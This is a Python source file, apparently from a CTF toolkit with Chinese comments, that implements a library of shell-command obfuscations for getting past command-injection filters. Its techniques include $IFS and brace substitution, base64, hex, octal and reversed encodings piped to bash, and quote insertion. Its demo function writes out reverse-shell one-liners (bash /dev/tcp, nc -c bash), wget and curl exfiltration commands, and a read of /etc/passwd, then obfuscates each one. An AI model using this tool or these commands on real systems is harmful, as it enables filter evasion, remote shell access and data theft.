import random
from re import Pattern
from typing import Any

from ctf.utils.log import debug_log

SHELLS = ["bash", "sh"]


def _brace_list1(cmd: str) -> str:
    """
    cat /etc/passwd
    ->
    {"cat","/etc/passwd"}

    利用 Bash Brace Expansion + 逗号分隔
    """
    parts = cmd.split()
    if not parts:
        return cmd

    # 将命令按空格拆分成多个参数
    braced = "{" + ",".join(f'"{part}"' for part in parts) + "}"
    return braced


def _brace_list2(cmd: str) -> str:
    """
    cat /etc/passwd
    ->
    {'cat','/etc/passwd'}

    利用 Bash Brace Expansion + 逗号分隔
    """
    parts = cmd.split()
    if not parts:
        return cmd

    # 将命令按空格拆分成多个参数
    braced = "{" + ",".join(f"'{part}'" for part in parts) + "}"
    return braced


def _path_slash(cmd: str) -> str:
    """
    使用 ${PATH:0:1} 替代 /
    cat /etc/passwd
    ->
    cat ${PATH:0:1}etc${PATH:0:1}passwd
    """
    return cmd.replace("/", "${PATH:0:1}")


def _ifs1(cmd: str) -> str:
    """空格替换$IFS$9"""
    return cmd.replace(" ", "$IFS$9")


def _ifs2(cmd: str) -> str:
    """空格替换${IFS}"""
    return cmd.replace(" ", "${IFS}")


def _tab(cmd: str) -> str:
    """使用 Tab 字符替代空格（很多过滤器只过滤空格）"""
    # Tab 字符 \t
    return cmd.replace(" ", "\t")


def _bash_c_ifs1(cmd: str) -> str:
    """
    适用于java.lang.Runtime.getRuntime().exec()且尽量避免单双引号场景
    将命令包装为 bash -c <cmd_with_ifs> 形式
    """
    cmd_with_ifs = cmd.replace(" ", "$IFS$9")
    return f"bash -c {cmd_with_ifs}"


def _base64(cmd: str, shell: str = "bash") -> str:
    """
    echo d2hvYW1p | base64 -d | bash
    """
    import base64

    encoded = base64.b64encode(cmd.encode()).decode()
    return f"echo {encoded} | base64 -d | {shell}"


def _base64_bash_c(cmd: str) -> str:
    """bash -c "base64 -d <<< BASE64 | bash" """
    import base64

    encoded = base64.b64encode(cmd.encode()).decode()
    return f'bash -c "base64 -d <<< {encoded} | bash"'


def _hex1(cmd: str, shell: str = "bash") -> str:
    """
    printf '\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67' | bash
    """
    hex_encoded = "".join(f"\\x{c:02x}" for c in cmd.encode())
    return f"printf '{hex_encoded}' | {shell}"


def _hex2(cmd: str, shell: str = "bash") -> str:
    """
    echo -e '\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67' | bash
    """
    hex_encoded = "".join(f"\\x{c:02x}" for c in cmd.encode())
    return f"echo -e '{hex_encoded}' | {shell}"


def _oct1(cmd: str, shell: str = "bash") -> str:
    """
    printf '\\143\\141\\164\\040\\057\\146\\154\\141\\147' | bash
    八进制转义
    """
    oct_encoded = "".join(f"\\{c:03o}" for c in cmd.encode())
    return f"printf '{oct_encoded}' | {shell}"


def _rev1(cmd: str, shell: str = "bash") -> str:
    """
    利用 rev 命令倒置：echo 'galf/ tac' | rev | bash
    """
    reversed_cmd = cmd[::-1]
    return f"echo '{reversed_cmd}' | rev | {shell}"


def _rev2(cmd: str, shell: str = "bash") -> str:
    """
    利用 rev 命令倒置：echo 'galf/ tac' | rev | bash
    """
    reversed_cmd = cmd[::-1]
    return f'echo "{reversed_cmd}" | rev | {shell}'


def _backslash(cmd: str) -> str:
    """
    ls /tmp -> l\\s /\\t\\m\\p
    在每个字母数字字符前插入反斜杠（跳过空格和特殊shell字符）
    """
    result = []
    skip_chars = {
        " ",
        "|",
        "&",
        ";",
        "(",
        ")",
        "<",
        ">",
        "$",
        "`",
        "\\",
        '"',
        "'",
        "\n",
    }
    for ch in cmd:
        if ch not in skip_chars:
            result.append("\\" + ch)
        else:
            result.append(ch)
    return "".join(result)


def _dollar_brackets(cmd: str) -> str:
    """
    ls /tmp -> echo $(ls /tmp)
    仅对不含管道/重定向的简单命令有意义，用于嵌套执行触发
    """
    return f"echo $({cmd})"


def _double_quotes(cmd: str) -> str:
    """
    ls /tmp -> l\"\"s /\"\"tm\"\"p
    在每个字母数字字符之间插入 \"\"（跳过空格和特殊字符）
    """
    special = {
        " ",
        "|",
        "&",
        ";",
        "(",
        ")",
        "<",
        ">",
        "$",
        "`",
        "\\",
        '"',
        "'",
        "\n",
        "-",
        "/",
        "_",
        ".",
        "=",
    }
    result = []
    for ch in cmd:
        if ch not in special:
            result.append(ch + '""')
        else:
            result.append(ch)
    result2 = []
    chars = list(cmd)
    for i, ch in enumerate(chars):
        result2.append(ch)
        if ch not in special:
            if i + 1 < len(chars) and chars[i + 1] not in special:
                result2.append('""')
    return "".join(result2)


def _single_quotes(cmd: str) -> str:
    """
    ls /tmp -> l''s /''tm''p
    在每个字母数字字符之间插入 ''
    """
    special = {
        " ",
        "|",
        "&",
        ";",
        "(",
        ")",
        "<",
        ">",
        "$",
        "`",
        "\\",
        '"',
        "'",
        "\n",
        "-",
        "/",
        "_",
        ".",
        "=",
    }
    result = []
    chars = list(cmd)
    for i, ch in enumerate(chars):
        result.append(ch)
        if ch not in special:
            if i + 1 < len(chars) and chars[i + 1] not in special:
                result.append("''")
    return "".join(result)


def _empty_var(cmd: str) -> str:
    """
    ls /tmp -> l$@s /tm$@p
    在每个字母数字字符之间插入 $@（空变量）
    """
    special = {
        " ",
        "|",
        "&",
        ";",
        "(",
        ")",
        "<",
        ">",
        "$",
        "`",
        "\\",
        '"',
        "'",
        "\n",
        "-",
        "/",
        "_",
        ".",
        "=",
    }
    result = []
    chars = list(cmd)
    for i, ch in enumerate(chars):
        result.append(ch)
        if ch not in special:
            if i + 1 < len(chars) and chars[i + 1] not in special:
                result.append("$@")
    return "".join(result)


def _xxd(cmd: str, shell: str = "bash") -> str:
    """xxd -r 十六进制"""
    hex_str = cmd.encode().hex()
    return f"echo {hex_str} | xxd -r -p | {shell}"


def _base64_python3_c(cmd: str) -> str:
    """python -c 执行"""
    import base64

    encoded = base64.b64encode(cmd.encode("utf-8")).decode("ascii")
    payload = (
        f"python3 -c \"__import__('os').system("
        f"__import__('base64').b64decode('{encoded}').decode())\""
    )
    return payload


def _cmd_check(cmd: str, no: list[str | Pattern[str]]) -> bool:
    """
    检查 cmd 是否不包含任何禁止项。
    no 中每个元素可以是：
      - 单个字面字符（如 "'", " ", "("）
      - 字符串关键词（如 "bash"）
      - 编译好的正则 Pattern
    返回 True 表示 cmd 合法（无禁止项），False 表示命中禁止项。
    """
    for item in no:
        if isinstance(item, Pattern):
            if item.search(cmd):
                return False
        else:
            # 字面字符串/字符，直接包含检查
            if item in cmd:
                return False
    return True


OBFUSCATIONS: dict[str, dict[str, Any]] = {
    "brace_list1": {
        "func": _brace_list1,
        "no": ['"', "'", "{", "}", ","],
    },
    "brace_list2": {
        "func": _brace_list2,
        "no": ['"', "'", "{", "}", ","],
    },
    "path_slash": {
        "func": _path_slash,
        "no": ["'"],  # 单引号下不会展开
    },
    "ifs1": {
        "func": _ifs1,
        "no": ["'"],  # 单引号将可能导致$IFS不被展开
    },
    "ifs2": {
        "func": _ifs2,
        "no": ["'"],  # 单引号将可能导致$IFS不被展开
    },
    "tab": {
        "func": _tab,
    },
    "bash_c_ifs1": {
        "func": _bash_c_ifs1,
        "no": ["'", '"'],
    },
    "base64": {
        "func": _base64,
        "other_arg": ["shell"],
    },
    "base64_bash_c": {
        "func": _base64_bash_c,
    },
    "hex1": {
        "func": _hex1,
        "other_arg": ["shell"],
    },
    "hex2": {
        "func": _hex2,
        "other_arg": ["shell"],
    },
    "oct1": {
        "func": _oct1,
        "other_arg": ["shell"],
    },
    "rev1": {
        "func": _rev1,
        "other_arg": ["shell"],
        "no": ["'", "\\", "$"],
    },
    "rev2": {
        "func": _rev2,
        "other_arg": ["shell"],
        "no": ['"', "\\", "$"],
    },
    "backslash": {
        "func": _backslash,
        "no": ["\\"],
    },
    "dollar_brackets": {
        "func": _dollar_brackets,
        "no": [">", "<", ")"],
    },
    "double_quotes": {
        "func": _double_quotes,
        "no": ['"'],
    },
    "single_quotes": {
        "func": _single_quotes,
        "no": ["'", "$"],
    },
    "empty_var": {
        "func": _empty_var,
    },
    "xxd": {"func": _xxd, "other_arg": ["shell"]},
    "base64_python3_c": {
        "func": _base64_python3_c,
    },
}


def apply_obf(name: str, cmd: str, **kwargs) -> str | None:
    """
    name:   OBFUSCATIONS 中的键
    cmd:    待混淆命令
    kwargs: 额外参数，如 shell="sh"
    """
    entry = OBFUSCATIONS[name]
    no = entry.get("no", [])
    if no and not _cmd_check(cmd, no):
        debug_log(
            f"cmd contains disallowed pattern. name:{name} no:{no} kwargs:{kwargs} cmd:{cmd}",
            "apply_obf",
        )
        return None
    func = entry["func"]
    extra = entry.get("other_arg", [])
    call_kwargs = {k: kwargs[k] for k in extra if k in kwargs}
    obf_cmd = func(cmd, **call_kwargs)
    debug_log(f"methods:{name} cmd:{cmd} obf_cmd:{obf_cmd}", "apply_obfs")
    return obf_cmd


def apply_obfs(cmd: str, obf: list[str] | None = None, **kwargs) -> str | None:

    if not cmd:
        return None
    current_cmd = cmd

    methods: list[str] = []

    # 过滤不存在的方法
    valid_obfs = [o for o in (obf or []) if o in OBFUSCATIONS]

    methods.extend(valid_obfs)

    # 如果没有指定方法
    if not methods:
        debug_log("no obfuscation methods")
        return None

    for idx, method in enumerate(methods, start=1):
        result = apply_obf(method, current_cmd, **kwargs)

        if result is None:
            debug_log(
                f"第 {idx} 层失败: [{method}] cmd:{current_cmd}",
            )

            return None
        current_cmd = result
    return current_cmd


def random_obf(
    cmd: str,
    obf: list[str] | None = None,
    depth: int = 4,
    args: dict[str, str | list[str]] | None = None,
) -> str:
    """
    随机深度混淆，支持参数随机化
    :param cmd: 原始命令
    :param obf: 指定可用的技术
    :param depth: 混淆深度
    :param args: 参数字典，值可以是字符串或列表（列表则随机抽取）
    :return: 混淆后的字符串
    """
    current_cmd = cmd
    obf = obf or []
    methods = (
        list(OBFUSCATIONS.keys()) if not obf else list(set(obf) & OBFUSCATIONS.keys())
    )
    for i in range(depth):
        success = False
        shuffled_methods = methods[:]
        random.shuffle(shuffled_methods)

        for name in shuffled_methods:
            current_kwargs = {}
            for k, v in (args or {}).items():
                if isinstance(v, list):
                    current_kwargs[k] = random.choice(v)
                else:
                    current_kwargs[k] = v

            result = apply_obf(name, current_cmd, **current_kwargs)

            if result:
                debug_log(f"第 {i + 1} 层: [{name}] -> 参数: {current_kwargs}")
                current_cmd = result
                success = True
                break

        if not success:
            debug_log(f"第 {i + 1} 层: 无可用方法，提前结束")
            break

    return current_cmd


def demo():
    from ctf.utils.local_ip import get_ip

    ip = get_ip()

    cat_passwd = "cat /etc/passwd"

    wget_cmd = f"bash -c 'wget http://{ip}:8000/ --method=POST --body-data=$(printf %s.. $(ls /tmp))'"
    curl_cmd = f"bash -c 'curl -d $(printf %s.. $(ls /tmp)) http://{ip}:8000/'"

    bash_i = f"bash -i >& /dev/tcp/{ip}/9000 0>&1"
    nc_e = f"nc -c bash {ip} 9000"

    cmds = [cat_passwd, bash_i, nc_e, wget_cmd, curl_cmd]

    for cmd in cmds:
        print(cmd)
        print(f"[random_obf]\n{random_obf(cmd)}")
        obfs = ["base64", "bash_c_ifs1", "brace_list1"]
        print(f"[apply_obfs({obfs})]\n{apply_obfs(cmd, obfs)}")
        obfs = ["base64", "bash_c_ifs1"]
        print(f"[apply_obfs({obfs})]\n{apply_obfs(cmd, obfs)}")
        obfs = ["bash_c_ifs1"]
        print(f"[apply_obfs({obfs})]\n{apply_obfs(cmd, obfs)}")
        obfs = ["base64", "rev2", "xxd", "rev1"]
        print(f"[apply_obfs({obfs})]\n{apply_obfs(cmd, obfs)}")
        obfs = ["base64"]
        print(f"[apply_obfs({obfs})]\n{apply_obfs(cmd, obfs)}")
        print("\n")


if __name__ == "__main__":
    # __import__("tool.base", fromlist=["set_debug"]).set_debug()
    demo()
